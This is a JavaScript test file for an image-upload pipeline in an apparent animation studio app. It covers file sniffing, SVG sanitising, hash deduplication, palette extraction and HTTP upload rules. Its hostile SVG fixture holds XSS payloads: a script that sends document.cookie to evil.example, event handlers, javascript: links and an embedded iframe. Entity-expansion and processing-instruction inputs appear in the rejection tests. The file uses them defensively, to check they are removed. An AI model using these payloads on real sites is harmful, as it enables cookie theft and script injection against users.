// Uploads: PNG, JPEG and SVG files become image assets; a hostile SVG is sanitised (or rejected);
// duplicates are found by content hash; a palette and a thumbnail are extracted; the agent's
// description takes an upload off the needs-description list and makes it findable by its tags;
// an SVG draws on through f.svg. Every test image is made here, never downloaded.

import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { createCanvas, loadImage } from '../src/render/host.js';
import { sanitizeSvg, vectorModel, parseXml, SvgError } from '../src/studio/svg.js';
import { sniff } from '../src/studio/uploads.js';
import { createStudioServer } from '../src/server/http.js';
import { tempStudio, AUTHOR } from './helpers.js';

const HOSTILE = `<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="100" viewBox="0 0 200 100" onload="alert(1)">
  <script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
  <style>@import url(https://evil.example/x.css); rect { fill: red }</style>
  <defs><linearGradient id="g"><stop offset="0" stop-color="#ffd166"/><stop offset="1" stop-color="#ff5c8a"/></linearGradient></defs>
  <rect id="box" x="10" y="10" width="180" height="80" rx="16" fill="url(#g)" onclick="steal()" style="stroke: #1b1f3b; stroke-width: 4; background: url(https://evil.example/track.png)"/>
  <use xlink:href="https://evil.example/sprite.svg#icon" x="0" y="0"/>
  <use href="#box" x="0" y="0" opacity="0.2"/>
  <image href="https://evil.example/pixel.png" width="10" height="10"/>
  <foreignObject width="100" height="100"><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example"></iframe></foreignObject>
  <a href="javascript:alert(2)"><circle cx="100" cy="50" r="20" fill="#1b1f3b"/></a>
  <animate attributeName="href" to="javascript:alert(3)"/>
</svg>`;

const LOGO = `<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120">
  <path d="M20 100 L60 20 L100 100 Z" fill="#7b5cff" stroke="#16121f" stroke-width="6" stroke-linejoin="round"/>
  <circle cx="60" cy="72" r="14" fill="#ffd166"/>
</svg>`;

let t, studio, server, base;
before(async () => {
  t = tempStudio();
  studio = t.studio;
  server = /** @type {any} */ (createStudioServer(studio, { env: { PATH: '' } }));
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  base = `http://127.0.0.1:${server.address().port}`;
});
after(async () => {
  server.closeAllConnections();
  await new Promise((resolve) => server.close(resolve));
  await t.cleanup();
});

/** A two-colour test picture: left 3/4 one colour, right 1/4 another. */
function picture(type = 'image/png', left = '#2a6f97', right = '#ffd166') {
  const c = createCanvas(160, 90);
  const g = c.getContext('2d');
  g.fillStyle = left; g.fillRect(0, 0, 120, 90);
  g.fillStyle = right; g.fillRect(120, 0, 40, 90);
  return c.toBuffer(/** @type {any} */ (type));
}

test('file types are read from the bytes', () => {
  assert.equal(sniff(picture()).kind, 'png');
  assert.equal(sniff(picture('image/jpeg')).kind, 'jpeg');
  assert.equal(sniff(picture('image/webp')).kind, 'webp');
  assert.equal(sniff(Buffer.from(LOGO)).kind, 'svg');
  assert.equal(sniff(Buffer.from(HOSTILE)).kind, 'svg');
  assert.equal(sniff(Buffer.from('GIF89a…')), null);
  assert.equal(sniff(Buffer.from('<html><svg></svg></html>')), null);
});

test('a hostile SVG is sanitised: no script, handlers, external references, foreignObject, style or animation survive', async () => {
  const { svg, removed, tree } = sanitizeSvg(HOSTILE);
  for (const bad of [/<script/i, /onload/i, /onclick/i, /evil\.example/, /<foreignObject/i, /<iframe/i, /<style/i, /@import/, /javascript:/i, /<image/i, /<animate/i, /<a[\s>]/]) {
    assert.doesNotMatch(svg, bad, `${bad} is gone`);
  }
  assert.match(svg, /<rect id="box"[^>]*fill="url\(#g\)"[^>]*style="stroke: #1b1f3b; stroke-width: 4"/, 'safe drawing and a local gradient reference stay');
  assert.match(svg, /<use href="#box"/, 'a local <use> stays');
  assert.match(svg, /<circle cx="100"/, 'the contents of the link stay');
  for (const what of ['event handler onload on <svg>', '<script>', '<style>', 'external xlink:href on <use>', '<image>', '<foreignObject>', '<a> (its contents kept)', '<animate>', 'event handler onclick on <rect>', 'style property "background" on <rect>']) {
    assert.ok(removed.includes(what), `reports: ${what} (got ${removed.join(' | ')})`);
  }
  const model = vectorModel(tree);
  assert.equal(model.paths.length, 3, 'the rect, the <use> copy and the circle');
  assert.equal(model.paths[0].fill, '#ffd166', 'a gradient fill becomes its first stop');
  const img = await loadImage(Buffer.from(svg));
  const c = createCanvas(200, 100);
  c.getContext('2d').drawImage(img, 0, 0);
  assert.equal(c.getContext('2d').getImageData(100, 50, 1, 1).data[3], 255, 'the sanitised SVG still draws');
});

test('SVGs that cannot be accepted are rejected with the reason', () => {
  assert.throws(() => sanitizeSvg('<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x "xxxxxxxx">]><svg>&x;</svg>'), (e) => e instanceof SvgError && /DOCTYPE or entity/.test(e.message));
  assert.throws(() => sanitizeSvg('<svg><text>&nbsp;</text></svg>'), /unknown entity &nbsp;/);
  assert.throws(() => sanitizeSvg('<html><body/></html>'), /root element must be <svg>/);
  assert.throws(() => sanitizeSvg('<svg><g></svg>'), /does not close/);
  assert.throws(() => sanitizeSvg('<svg width=100></svg>'), /bad attribute/);
  assert.throws(() => sanitizeSvg('<?php echo 1 ?><svg/>'), /processing instructions/);
  assert.equal(parseXml('<svg><title>A &amp; B</title></svg>').children[0].children[0].children[0].text, 'A & B');
});

test('uploads become image assets with size, palette and thumbnail, on the needs-description list; duplicates are found by hash', async () => {
  const png = await studio.uploads.upload({ name: 'Harbour at dusk.png', data: picture(), author: 'user' });
  assert.equal(png.duplicate, false);
  const a = png.asset;
  assert.equal(a.slug, 'harbour-at-dusk');
  assert.equal(a.title, 'Harbour at dusk');
  assert.equal(a.needsDescription, true);
  assert.deepEqual(a.tags, ['upload', 'photo']);
  assert.equal(a.meta.width, 160);
  assert.equal(a.meta.palette[0], '#2a6f97', 'the dominant colour first');
  assert.ok(a.meta.palette.includes('#ffd166'));
  assert.ok(a.thumb);
  const again = await studio.uploads.upload({ name: 'copy of harbour.png', data: picture(), author: 'user' });
  assert.equal(again.duplicate, true);
  assert.equal(again.asset.ref, 'harbour-at-dusk@1');
  const jpg = await studio.uploads.upload({ name: 'harbour.jpg', data: picture('image/jpeg', '#7cc576'), author: 'user' });
  assert.equal(jpg.asset.slug, 'harbour');
  assert.equal(jpg.asset.meta.format, 'jpeg');
  const svg = await studio.uploads.upload({ name: 'Hostile badge.svg', data: Buffer.from(HOSTILE), author: 'user' });
  assert.ok(svg.removed.includes('<script>'));
  assert.equal(svg.asset.meta.format, 'svg');
  assert.deepEqual(svg.asset.meta.natural, { width: 200, height: 100 });
  assert.equal(svg.asset.meta.width, 2048, 'rasterised large enough to scale down');
  const kept = readFileSync(join(t.dataDir, svg.asset.meta.sidecar), 'utf8');
  assert.doesNotMatch(kept, /script|evil|onload/i, 'what is stored is the sanitised SVG');
  await assert.rejects(studio.uploads.upload({ name: 'bomb.svg', data: Buffer.from('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">]><svg>&lol;</svg>'), author: 'user' }), /The SVG was rejected: a DOCTYPE/);
  await assert.rejects(studio.uploads.upload({ name: 'notes.txt', data: Buffer.from('hello'), author: 'user' }), /not a PNG, JPEG, WebP or SVG/);
  assert.deepEqual(studio.uploads.undescribed().map((x) => x.slug), ['harbour-at-dusk', 'harbour', 'hostile-badge']);
});

test('the agent describes an upload; it leaves the list and search finds it by those tags', () => {
  const r = studio.uploads.describe({ slug: 'harbour-at-dusk', title: 'Harbour at dusk', description: 'A flat two-tone harbour scene: deep blue water and a warm yellow strip of sky.', tags: ['harbour', 'dusk', 'blue', 'background'], uses: ['full-frame background under titles', 'slow Ken Burns pan'], author: 'agent' });
  assert.equal(r.needsDescription, false);
  assert.deepEqual(r.tags, ['harbour', 'dusk', 'blue', 'background', 'upload']);
  assert.deepEqual(r.suggestedUses, ['full-frame background under titles', 'slow Ken Burns pan']);
  assert.equal(r.version, 1, 'no new version');
  assert.deepEqual(studio.library.search({ tags: ['harbour', 'dusk'] }).assets.map((a) => a.slug), ['harbour-at-dusk']);
  assert.ok(studio.library.search({ query: 'warm yellow sky' }).assets.some((a) => a.slug === 'harbour-at-dusk'));
  assert.equal(studio.library.search({ needsDescription: true }).assets.some((a) => a.slug === 'harbour-at-dusk'), false);
});

test('an uploaded SVG draws on and recolours through f.svg; images work as params of function assets', async () => {
  const logo = (await studio.uploads.upload({ name: 'logo.svg', data: Buffer.from(LOGO), author: 'user' })).asset;
  assert.equal(logo.meta.vector.paths.length, 2);
  await studio.library.createAsset({ slug: 'logo-draw', author: AUTHOR, source: `asset({
    description: 'Draws an SVG logo on, stroke first, then fills it; recolourable.',
    tags: ['logo', 'svg', 'test'],
    duration: 2,
    params: { logo: { type: 'image', default: '${logo.ref}' }, color: { type: 'color', default: '#7b5cff' } },
    render(f, p) { f.svg(p.logo).draw(f.ctx, { width: f.width, height: f.height, progress: f.progress, fill: p.color }); },
  });` });
  await studio.library.createAsset({ slug: 'ken-burns', author: AUTHOR, source: `asset({
    description: 'A slow push-in on a photo (Ken Burns), cropped to the frame.',
    tags: ['photo', 'test'],
    duration: 2,
    params: { photo: { type: 'image', default: 'harbour-at-dusk' }, zoom: { type: 'number', default: 0.3 } },
    render(f, p) {
      const img = f.image(p.photo);
      const k = Math.max(f.width / img.width, f.height / img.height) * (1 + p.zoom * f.progress);
      f.ctx.drawImage(img, (f.width - img.width * k) / 2, (f.height - img.height * k) / 2, img.width * k, img.height * k);
    },
  });` });
  const px = async (ref, t, params = {}) => {
    const r = await studio.assetFrame({ ref, t, params, width: 240, height: 240, background: '#000000' });
    const img = await loadImage(r.png);
    const c = createCanvas(240, 240);
    c.getContext('2d').drawImage(img, 0, 0);
    return (x, y) => [...c.getContext('2d').getImageData(x, y, 1, 1).data];
  };
  const start = await px('logo-draw', 0), end = await px('logo-draw', 1.95, { color: '#00ff00' });
  assert.deepEqual(start(120, 160).slice(0, 3), [0, 0, 0], 'nothing drawn at progress 0');
  const [r, g, b] = end(120, 160);
  assert.ok(g > 200 && r < 60 && b < 60, `recoloured fill at the end (${r},${g},${b})`);
  const kb = await px('ken-burns', 1);
  assert.deepEqual(kb(60, 120).slice(0, 3), [0x2a, 0x6f, 0x97], 'the photo param is drawn');
  await assert.rejects(studio.library.createAsset({ slug: 'svg-on-png', author: AUTHOR, source: `asset({ description: 'Calls f.svg on a raster image, which has no vector drawing.', tags: ['t'], params: { img: { type: 'image', default: 'harbour' } }, render(f, p) { f.svg(p.img); } });` }), /has no vector drawing/);
});

test('HTTP: one raw image per request; anything else is refused', async () => {
  const up = (body, type, extra = {}) => fetch(`${base}/api/uploads?name=${encodeURIComponent(extra.name ?? 'drop.png')}`, { method: 'POST', headers: { 'content-type': type, ...(extra.headers ?? {}) }, body });
  const ok = await up(picture('image/png', '#ff5c8a', '#16121f'), 'image/png', { name: 'pink.png' });
  assert.equal(ok.status, 200);
  const body = await ok.json();
  assert.equal(body.asset.slug, 'pink');
  assert.equal(body.duplicate, false);
  const svg = await up(LOGO.replace('#7b5cff', '#2dd4bf'), 'image/svg+xml', { name: 'teal logo.svg' });
  assert.equal((await svg.json()).asset.slug, 'teal-logo');
  assert.equal((await up('hello', 'text/plain')).status, 415);
  assert.equal((await up(JSON.stringify({ a: 1 }), 'application/json')).status, 415);
  assert.equal((await up(picture(), 'image/png', { headers: { origin: 'https://evil.example' } })).status, 403);
  const list = await (await fetch(`${base}/api/uploads`)).json();
  assert.ok(list.assets.some((a) => a.slug === 'pink'));
  assert.ok((await (await fetch(`${base}/api/assets?needsDescription=1`)).json()).assets.some((a) => a.slug === 'teal-logo'));
});
